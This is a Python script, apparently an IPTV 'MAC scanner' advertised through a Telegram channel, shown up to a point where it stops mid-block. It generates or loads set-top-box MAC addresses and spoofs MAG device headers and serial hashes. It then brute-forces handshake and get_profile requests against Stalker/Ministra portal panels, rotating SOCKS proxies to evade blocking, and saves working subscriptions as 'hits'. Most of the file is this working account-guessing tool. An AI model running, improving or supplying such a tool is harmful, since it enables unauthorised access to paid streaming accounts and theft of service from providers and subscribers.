import os,pip
import datetime,os
import socket,hashlib
import json,random,sys, time,re
nickn=""
nickn=""
if nickn=="":
	nickn="https://t.me/iptvfreekyng"
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except: pass
import subprocess
import pathlib
from playsound import playsound
subprocess.run("cls", shell=True)
try:
	import requests
except:
	print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
	pip.main(['install', 'requests'])
import requests
try:
	import sock
except:
	print("sock modulu yüklü değil \n sock modulü yükleniyor \n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
	import sock



subprocess.run("cls", shell=True)

oto=0
tur=0
Seri=""
csay=0

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)

try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()

os.system('cls')
say=0
yanpanel="hata" 
imzayan="" 
bul=0
hit=0
prox=0
cpm=1


macSayisi=999999999999991# 1#deneme sayisı
feyzo=("""\33[0m \33[0m\33[1;107m                    \33[0m\33[1;41m                   
\33[0m \33[31m\33[1;107m    https://t.me/iptvfreekyng​        \33[0m\33[1;41m PY  CONFIG        \33[0m
\33[0m \33[0m\33[1;107m                    \33[0m\33[1;41m                   \33[0m
\33[33m                       
    
\33[0m \33[0m\33[1;107m                    \33[0m\33[1;41m                   
\33[0m \33[31m\33[1;107m     https://t.me/iptvfreekyng        \33[0m\33[1;41m PY  CONFIG        \33[0m
\33[0m \33[0m\33[1;107m                    \33[0m\33[1;41m                   \33[0m\33[0m 
   \33[0;1m""")
print(feyzo) 
kisacikti=""
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
ozelmac=""
#################
nick='@FeyzullahK'
bekleme=1
subprocess.run("cls", shell=True)
print(feyzo) 
panel = input("""
 \33[1;107;91m1= portal.php (Пользователский UserAgent) \33[0m 
 \33[1;107;90m2= portal.php (White Cnf) \33[0m
 \33[1;107;90m3= portal.php (White Ultra) \33[0m
 \33[1;44;91m4= ortal.php (Real Blue)  \33[0m 
 \33[1;44;97m5= server/load.php (Real Blue)  \33[0m
 \33[1;41;97m6= server/load.php (Panel:Port Write Directly) \33[0m
 7= stalker_portal 
 8= xUi /c/server/load.php 
 9= xUi /c/portal.php 
 10= bs.mag.portal 
 11= portalcc.php 
 12= magLoad.php 
 12= /ministra/portal.php 
 14= I will reveal myself 
	
           \33[1;32m
         x = Extend waiting time \33[0m
           \33[36m
         z = Short Config Output \33[0m
           \33[1;31m
         q = KeyCheck Cancel \33[0m

	
	\33[1;40m
\33[1;37;44mPanel:Port= \33[0m\33[31m\33[1;37;41m""") 
print('\33[0m')

subprocess.run("cls", shell=True)

reddos="açık"
if panel =="q":
	reddos="kapat"
	print(feyzo) 
	panel = input("""

 \33[1;107;90m1= portal.php (Beyaz Panel UserAgent) 
 2= portal.php (White Cnf) \33[0m 
 \33[1;107;90m3= portal.php (White Ultra) \33[0m
 \33[1;44;91m4= portal.php (Real Blue)  \33[0m 
 \33[1;44;97m5= server/load.php (Real Blue)  \33[0m
 \33[1;41;97m6= server/load.php (Panel:Port Write Directly) \33[0m
 7= stalker_portal 
 8= xUi /c/server/load.php 
 9= xUi /c/portal.php 
 10= bs.mag.portal 
 11= portalcc.php 
 12= magLoad.php 
 13= /ministra/portal.php 
 14= I will reveal myself 
	\33[1;41m
	»» x =  Extend waiting time  
	»» z =  Short Config Output   \33[1;44m
	
\33[1;41mKeyCheck Kapalı Closed	

\33[1;41mKeyCheck Closed	

\33[1;44m
Example Panel Name:Port = iptvturkiye.xyz:8080\n
	\33[1mPlease write or paste panel name! 
	
	\33[1;40m
Panel:Port= \33[0m\33[31m\33[1;37;41m""")
print('\33[0m')

uzmanc=""
uzmanm="server/load.php"
useragent="okhttp/4.7.1"
if len(panel)==1 or len(panel)==2:# panel=="1":
    


    uzmanm=panel
    print(uzmanm)
    if uzmanm=="14":
    	uzmanm=input("Cevap=")
    if  uzmanm=="1":
    	uzmanm="portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	
    if uzmanm=="2":
    	uzmanm="portal.php"
    	uzmanc="portal"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    if uzmanm=="3":
    	uzmanm="portal.php"
    	uzmanc="ultra"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3"
    if uzmanm=="4":
    	uzmanm="portal.php"
    	uzmanc="realblue"
   
    if uzmanm=="5":
    	uzmanm="server/load.php"
    	uzmanc="realblue"
    	
    if uzmanm=="" or uzmanm=="6":
    	uzmanm="server/load.php"
    if uzmanm=="7":
    	uzmanm="stalker_portal/server/load.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
    	uzmanc="stalker"
    if uzmanm=="8":
    	uzmanm="c/server/load.php"
    if uzmanm=="9":
    	uzmanm="c/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    if uzmanm=="10":
    	uzmanm="bs.mag.portal.php"
    if uzmanm=="11":
    	uzmanm="portalcc.php"
    if uzmanm=="12":
    	uzmanm="magLoad.php"
    if uzmanm=="13":
    	uzmanm="ministra/portal.php"    	
    if uzmanm=="x":
    	bekleme=input(int("Bekleme Süresini Saniye bazında yazın.\n Saniye="))
    	uzmanm="server/load.php"
    if uzmanm=="z":
    		kisacikti="1"
    		uzmanm="server/load.php"   
    				
    subprocess.run("cls", shell=True)
    print(feyzo) 
    panel = input("""
Example Panel Name:Port = HOST:PORT\n
	\33[1mPlease write or paste panel name! \n\n
Panel:Port= \33[0m\33[31m\33[1m""")
#print(panel.split('/')[3])

if bekleme=="":
	bekleme=1
else:
	bekleme=int(bekleme)
try:
	if panel.split('/')[3] =='stalker_portal':
		uzmanm="stalker_portal/server/load.php"
		panel=panel.replace('/stalker_portal','')
		uzmanc='stalker'
except:pass
print(panel)
#	print(panel)#http://z.zcatt.cc/stalker_portal/c/
#subprocess.run(["clear", ""])
print("\33[1;40m"+feyzo) 
kanalkata="0"
kanalkata=input("""\33[1;40m
Channel Categories be included in the signature?
	0= Addition
	1= Only Channel category
	2= Add them all (Live-VOD SERIS)

\33[1mAnswer= """)



subprocess.run("cls", shell=True)
print(feyzo) 

combo=input("""
	Select the type of scan..!
1= Combo
2= Automatic Combo

 Answer= """ )
subprocess.run("cls", shell=True)
print(feyzo) 
totLen="000000"
if combo=="1":
 	say=0
 	dsy=""
 	dir='./combo/'
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	"+str(say)+"= "+files+'\n'
 	print ("""Choose your combo from the list below!!!
"""+dsy+"""
\33[33mThere are """ +str(say)+""" in your combo folder
	""")
 	dsyno=str(input(" \33[31mCombo No = \33[0m"))
 	say=0
 	for files in os.listdir (dir):
 			say=say+1
 			if dsyno==str(say):
 				dosyaa=(dir+files)
 	say=0
 	print(dosyaa) 
 	c=open(dosyaa, 'r')
 	
 	totLen=c.readlines()
 	subprocess.run("cls", shell=True)
 	print(feyzo) 
 	baslama=""
 	baslama=input("""
In the file in the selected combo \33[1;31;43m"""+str(len(totLen))+"""\33[0;40m Macs are foreseen.
 
If you want to change the combo initial scan order 

Yes =  Write the row number.
No =   Just press OK Enter.

		Enter Answer= """)
 	if not baslama =="":
 		baslama=int(baslama)
 		csay=baslama
 		
 		
subprocess.run("cls", shell=True)
print(feyzo)  	
if combo=="1":
	print("\n\nSo that it can continue scanning when the mac in your combo is running low")
	
macyazi=("""
\33[1mSelect type of mac combination...?\33[0m
\33[33mFor cascading mac = \33[31m1
\33[33mFor random mac   = \33[31m2

\33[0m\33[1mMac Combination Type= \33[31m""")
macturu=input(macyazi)
if macturu=="":
	macturu="2"
#################
#print("\nTaranacak Panel:Port=\33[1m\33[31m" + panel +"\33[0m\n") 
#D4:CF:F9
#MacCombo="33:44:CF:4"
MacCombo="00:1A:79:"
#MacCombo="10:27:be:"

subprocess.run("cls", shell=True)
print(feyzo)  	

Macs = input("""\33[0;1m
If you don't want to choose a match type, leave it blank...

	0 = Running MAC test 

	1= 00:1A:79: (Default)
	2= 10:27:BE:
	3= 33:44:CF:
	4= A0:BB:3E:
	5= I will determine myself...
	
Change mac type, enter no...

Enter Answer= """) 
#\33[33mUse Serial Mac?
#\33[1m\33[34mYes (1) \33[0m or \33[1m\33[32mNo (2) \33[0m Write!! 


if Macs=="0":
	macSayisi=1#int(input("Denecek mac sayısı =")) 
	ozelmac=input("Çalışan MAC Addres=")
dmac=""
if not  Macs=="0":
	dmac=Macs#input("""
#Default Mac Türü
#	1= 00:1A:79:
#	2= 10:27:BE:
#	3= 33:44:CF
#	4= Kendim Beliryeceğim...
#	""")
	if dmac=="" or dmac=="1":
                MacCombo="00:1A:79:"
                Macs = input("\33[0m\nUse Serial Mac? \nreply \33[1m\33[34mYes (1) \33[0m or \33[1m\33[32mNo (2) \33[0m Write!! =")

	if dmac=="2":
                MacCombo="10:27:BE:"
                Macs = input("\33[0m\nUse Serial Mac? \nreply \33[1m\33[34mYes (1) \33[0m or \33[1m\33[32mNo (2) \33[0m Write!! =")

	if dmac=="3":
                MacCombo="33:44:CF:"
                Macs = input("\33[0m\nUse Serial Mac? \nreply \33[1m\33[34mYes (1) \33[0m or \33[1m\33[32mNo (2) \33[0m Write!! =")

	if dmac=="4":
                MacCombo="A0:BB:3E:"
                Macs = input("\33[0m\nUse Serial Mac? \nreply \33[1m\33[34mYes (1) \33[0m or \33[1m\33[32mNo (2) \33[0m Write!! =")

	if dmac=="5":
                MacCombo=input("Write the first three match types...")
                Macs = input("\33[0m\nUse Serial Mac? \nreply \33[1m\33[34mYes (1) \33[0m or \33[1m\33[32mNo (2) \33[0m Write!! =")


if Macs[:1]=="e" or Macs[:1]=="E"  or Macs=="1":
    Seri=input("Sample="+MacCombo+"\33[31m5\33[0m\nSample="+MacCombo+"\33[31mor\33[32m\none or two values Write!!\33[0m\n\33[1m"+MacCombo+"\33[31m")
   # Seri=Seri[:2]
    #MacCombo=MacCombo+Seri[:2]
#################
#MacCombo=MacCombo
subprocess.run("cls", shell=True)
print(feyzo) 
#print(len(feyzo)) 
mm=MacCombo.replace(':',"")
#panel="titan.panel.tm"


if panel=="" :
    exit() 
#if len(mm)==6:
#	turet=6
#	MacCombo=MacCombo+":"
#if len(mm)==7:
#	turet=5
#if len(mm)==8:
#	turet=4
#	MacCombo=MacCombo+":"
Rhit='\33[33m' 
Ehit='\033[0m' 
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
panel=panel.replace('stalker_portal','/stalker_portal')
tkn1="a"
tkn2="a"
tkn3="a"
tkn4="a"
tkn5="a"
pro1="a"
pro2="a"
pro3="a"
trh1="a"
trh2="a"
trh3="a"
ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""
       
subprocess.run("cls", shell=True)
print(feyzo) 
acount_id=""
a="0123456789ABCDEF"
s=-1
ss=0
sss=0
ssss=0
sd=0
sdd=0
bad=0
proxies=""
proxi=input("""
	Do you want to use Proxies?
1 - Yes
2 - No

1 or 2 = """)
subprocess.run("cls", shell=True)
print(feyzo) 
if proxi =="1":
	say=0
	dsy=""
	dir='./proxies/'
	for files in os.listdir (dir):
		if files.endswith(".txt"):
			say=say+1
			dsy=dsy+"	"+str(say)+"-) "+files+'\n'
	print ("""
	Choose your combo from the list below!!!
"""+dsy+"""
\33[33mThere are """ +str(say)+""" files in your proxy folder!
Please select your Proxy Socks5 file...!
	""")
	dsyno=str(input(" \33[31mCombo No = \33[0m"))
	say=0
	for files in os.listdir (dir):
		if files.endswith(".txt"):
			say=say+1
			if dsyno==str(say):
				dosyaa=(dir+files)
	say=0
	proxies=""
	print(dosyaa) 
	Proxy=dosyaa
	c=open(Proxy,'r')
	sock=c.readlines()
	prox=0
	Proxy=dosyaa
	subprocess.run("cls", shell=True)
	print(feyzo) 
	pro=input("""
What is the proxy type in the file you selected?
	1 - ipVanish Socks5
	2 - free Socks4 
	3 - free Socks5
		Proxy type= """)
subprocess.run("cls", shell=True)
print(feyzo)
DosyaA="./Hits/" + panel.replace(":","_").replace('/','') +"@https://t.me/iptvfreekyng.txt"
def yaz(hits):
    dosya=open(DosyaA,'a+', encoding='utf-8') 
    dosya.write(hits)
    dosya.close()
subprocess.run("cls", shell=True)
print(feyzo) 
macaddres=MacCombo
def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()

    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')
import time
from datetime import date

def tarih_clear(trh):
	#trh=tarih_exp
	ay=""
	gun=""
	yil=""
	trai=""
	my_date=""
	sontrh=""
	out=""
	ay=str(trh.split(' ')[0])
	gun=str(trh.split(', ')[0].split(' ')[1])
	yil=str(trh.split(', ')[1])
	ay=str(month_string_to_number(ay))
	#print(ay)
	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
	my_date = str(trai)
	#print(my_date)
	if 1==1:#try:
		#sontrh=(int(datetime.datetime.strptime(my_date, '%d/%m/%Y').strftime("%s")))
		#sontrh=str(datetime.datetime(yil, ay, gun, 0, 0).timestamp())
		
		d = date(int(yil), int(ay), int(gun))
		sontrh = time.mktime(d.timetuple())
		out=(int((sontrh-time.time())/86400))
		return out
	#except:pass
	
	
			
for mag in range(16**6):
	oto=""
	macr=""
	tur=0
	hex_num = hex(mag)[2:].zfill(6)
	try:
		genmac = str(MacCombo)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
	except:pass
	genmac=genmac.replace(':100',':10')
#	print(Seri)
	if len(Seri) ==1:
	   genmac=str(genmac).replace(str(genmac[:10]),macaddres+Seri)
	if len(Seri)==2:
	   genmac=str(genmac).replace(str(genmac[:11]),macaddres+Seri)
	macr=(genmac)
	s=s+1
	if s ==16:
		ss=ss+1
		s=0
	if ss ==16:
		sss=sss+1
		ss=0
		s=0
	if sss==16:
		ssss=ssss+1
		sss=0
		ss=0
		s=0
	if ssss==16:
		sd=sd+1
		ssss=0
		sss=0
		ss=0
		s=0		
	if sd==16:
		sdd=sdd+1
		sd=0
		sss=0
		ss=0
		s=0

	if sdd==16:
		sdd=0
		sd=0
		sss=0
		ss=0
		s=0
	
	seri1=a[sdd]
	seri2=a[sd]
	#print(Seri)
	if not Seri=="":
		if len(Seri)==1:
			seri1=Seri[0]
			
		if len(Seri)==2:
			seri1=Seri[0]
			seri2=Seri[1]
	maca=(seri1+seri2+":"+a[ssss]+a[sss]+":"+a[ss]+a[s])
	#print(maca)
	if macturu =="1":
		mac=mac=MacCombo+maca
	else:
		mac=macr
	
		
		
	
	
	
	#macs=mac.replace(':','%3A')
	#mac=mac.upper()
	combo=combo
	if combo=="1":
		#print(combo)
		if len(totLen)-2 > csay:
			#print(combo)
			while True:
			    # print(csay)
			     csay=csay+1
			     if csay > len(totLen)-1 :
			     	#print("######")
			     	break
			     macv =re.search(pattern,totLen[csay],re.IGNORECASE)
			     if macv:
			     	mac=macv.group()
			     	if not dmac=="":
			     		#mac=mac.upper() 
			     		mac=mac.replace('00:1A:79',MacCombo).replace('00:1a:79',MacCombo)
			     	break
	
	
	if not ozelmac=="":
		mac=ozelmac
	#mac="00:1A:79:69:E6:BD"
	mac=mac.replace("::",":")
	mac=mac.replace(" ","")
	mac=mac.replace("::",":")
	mac=mac.replace(" ","")
	
	macs=mac.upper().replace(':','%3A')
	
	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
	SNENC=SN.upper()
	SNCUT=SNENC[:13]
	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
	DEVENC=DEV.upper()
	SG=SNCUT+'+'+(mac)
	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
	SINGENC=SING.upper() 
	
	HEADERA={
"User-Agent":useragent,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
	}	

	url1="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 
		
	if uzmanc=="portal":
		try:
			url="http://"+panel+"/c//version.js" 
			res = ses.get(url,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
			vir=str(res.text).split("'")[1].split("'")[0]
		except:pass
		url1="http://"+panel+"/portal.php?type=stb&action=handshake&token=1E3A20C221DF6C3EC477C30DBEFE8F07&prehash=6b1e45cc169162c9e876a29707236e54c24631db&JsHttpRequest=1-xml"
	
	
	if uzmanc=="realblue":
		HEADERA={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"X-User-Agent": "Model: MAG250; Link: WiFi",
"Cache-Control": "no-cache",
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis" ,
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
		}
	if uzmanc=="ultra":
			HEADERA={
"X-User-Agent":"Model: MAG254; Link: Ethernet,WiFi",
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3", 
"Referer":"http://"+panel+"/c/", 
"Accept":"application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
"Host":panel, 
"Cookie":"PHPSESSID=null; mac="+mac+"; stb_lang=en; timezone=Europe%2FParis; adid=90315b70fdf800b5c5181de836a8ec4d", 
"Accept-Encoding":"gzip, deflate", 
"Content-Type":"text/javascript;charset=UTF-8", 
"Connection":"keep-alive", 
"X-Powered-By":"PHP/5.6.3", 
			}
			url1="http://"+panel+"/"+uzmanm+"php?type=stb&action=handshake&token=&prehash=0&mac="+mac+"&JsHttpRequest=1-xml" 
	#url1="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&token=&JsHttpRequest=1-xml" 
		
		
	#print(url1)
	#print(panel)
	
	token=""
	veri=""
	#print(url1)
	
	
	if proxi =="1":
			if prox==len(sock)-2:
				prox=0
			#print("evet")
			if pro=="1":
					#print("1")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							#print(prox)
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							pip=pveri.split(':')[0]
							pport=pveri.split(':')[1]
							pname=pveri.split(':')[2]
							ppass=pveri.split(':')[3]
							proxies={'http':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport,
							'https':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport}
							print('\33[33mSocks5 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad)+"\33[0m" )
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=2, verify=False)
							veri=str(res.text)
							#print(str(req.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
			if pro=="2":
					#print("2")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							#print(pveri)
							pip=pveri.split(':')[0]#""
							pport=pveri.split(':')[1]#""
							proxies={'http':'socks4://'+pip+':'+pport,
						'https':'socks4://'+pip+':'+pport}
							print('Socks4 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad))
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=2, verify=False)
							veri=str(res.text)
							#print(str(re.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
	
			if pro=="3":
					#print("2")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							#print(pveri)
							pip=pveri.split(':')[0]#""
							pport=pveri.split(':')[1]#""
							proxies={'http':'socks5://'+pip+':'+pport,
						'https':'socks5://'+pip+':'+pport}
							print('Socks5 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad))
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=2, verify=False)
							veri=str(res.text)
							#print(str(re.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
		
	
	

	
#	try:
	#print(url1)
	else:
		#print(url1)
		bag1=0
		while True:
			try:
				res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=7, verify=False)
				veri=str(res.text)
				break
			except:
				bag1=bag1+1
				time.sleep(bekleme)
				if bag1==120:
					quit()
		bag1=0
		#print(url1)			
		veri=str(res.text)
		#print(veri)
		#quit()
		
		
	if 1==1:
            renk="\33[0m"
            if 'token' in veri:
            	token=veri.replace('{"js":{"token":"',"")
            	token=token.split('"')[0]
            	if 'random' in veri:
            		random=veri.split('random":"')[1]
            		#print(random)
            		random=random.split('"')[0]
            		#print(random)
            	#token=token.replace('"}}',"")
            	#print(token)
            	renk="\33[0m"
            else:
            	renk="\33[41m"
            
            say=say+1
            #print(token)⇶  x=⇶  
            total=str(say) 
            cpm=(time.time()-cpm)
            cpm=(round(60/cpm))
            print ("""\33[0m╭─────\33[0m\33[1;100m \33[1;30;107m https://t.me/iptvfreekyng         \33[0m\33[1;100m \33[0m\33[1;41m\33[1m PRO   \33[0m V.2   
├──  \33[1;36m\33[1mTotal = """+total+""" \33[33m Hit = """ + str(hit)+ """ \33[1;31;40m Cpm = """ +str(cpm)+"""      \33[0m
╰────""" +renk+mac+""" \33[1;32;40m""" +panel+""" \33[0m""")
            
            cpm=time.time()
            
            if 'token' in veri or reddos=="kapat":
            	
            
	            HEADERd={
"User-Agent":useragent,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+token,
	            }
	            
	         
	            url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml"
	            
	            if uzmanc=='stalker':
	            	url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&random="+str(random)+"&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22"+str(random)+"%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
	            
	            if uzmanc=="ultra":
	            	HEADERA={
"Authorization": "Bearer "+token,
"X-User-Agent":"Model: MAG254; Link: Ethernet,WiFi",
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3", 
"Referer":"http://"+panel+"/c/", 
"Accept":"application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
"Host":panel, 
"Cookie":"PHPSESSID=null; mac="+mac+"; stb_lang=en; timezone=Europe%2FParis; adid=90315b70fdf800b5c5181de836a8ec4d", 
"Accept-Encoding":"gzip, deflate", 
"Content-Type":"text/javascript;charset=UTF-8", 
"Connection":"keep-alive", 
"X-Powered-By":"PHP/5.6.3", 
	            	}
	            
	            if uzmanc=="portal":
	            	url2="http://"+panel+"/portal.php?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r23-254;%20ImageDate:%20Wed%20Oct%2031%2015:22:54%20EEST%202018;%20PORTAL%20version:%20"+vir+";%20API%20Version:%20JS%20API%20version:%20343;%20STB%20API%20version:%20146;%20Player%20Engine%20version:%200x58c&num_banks=2&sn="+SNCUT+"&client_type=STB&image_version=218&video_out=hdmi&device_id="+DEVENC+"&device_id2="+DEVENC+"&signature=1275CE35F07BABFAABCBFD3AF0A94790C5B5E619D3354942BD4009F375F94CD4&auth_second_step=1&hw_version=2.6-IB-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22"+SNCUT+"%22%2C%22type%22%3A%22STB%22%2C%22model%22%3A%22MAG254%22%2C%22uid%22%3A%22394EF2DA299FEDEB10410611EC0D4DCC82152444EB1DFD9B86D65C35AAD584EB%22%2C%22random%22%3A%22random%22%3A%22%22%7D&hw_version_2=39d95ea1affa08953d5951afeb1fbe57f8ffc23a&timestamp=1634575872&api_signature=262&prehash=9036d5f7dc752a23dfc087de916552a2de3e70bb&JsHttpRequest=1-xml" 
	          
	            bag1=0
	            if uzmanc=="realblue":
	            	HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"X-User-Agent": "Model: MAG250; Link: WiFi",
"Cache-Control": "no-cache",
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis" ,
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"Authorization": "Bearer "+token,
	            	}
	            	url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
	            	
	            	
	            	
	            if '/c/' in uzmanm:
